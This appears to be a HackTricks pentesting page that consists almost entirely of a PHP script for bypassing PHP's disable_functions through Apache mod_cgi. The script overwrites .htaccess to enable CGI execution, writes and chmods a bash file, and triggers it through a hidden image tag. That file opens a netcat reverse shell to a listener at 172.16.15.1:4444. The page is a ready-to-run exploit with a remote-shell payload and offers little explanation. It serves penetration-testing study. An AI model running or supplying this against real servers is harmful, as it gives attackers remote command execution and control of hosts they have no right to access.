---
title: "disable_functions bypass - mod_cgi"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

# mod_cgi

```
<?php
// Requires mod_cgi, a writable directory, and .htaccess overrides.
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; // Command to execute.
$shellfile = "#!/bin/bash\n";
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; // CGI response header.
$shellfile .= "$cmd";
function checkEnabled($text, $condition, $yes, $no)
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); // Test whether .htaccess is honored.
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); // Run the check again.
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules());
	$writable = is_writable('.');
	$htaccess = !empty($_SERVER['HTACCESS']);
		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");
	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!";
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Succeeded! Saved in .htaccess.bak","Failed!");
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!");
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!");
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!");
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>";
	}
}
?>
```
## References
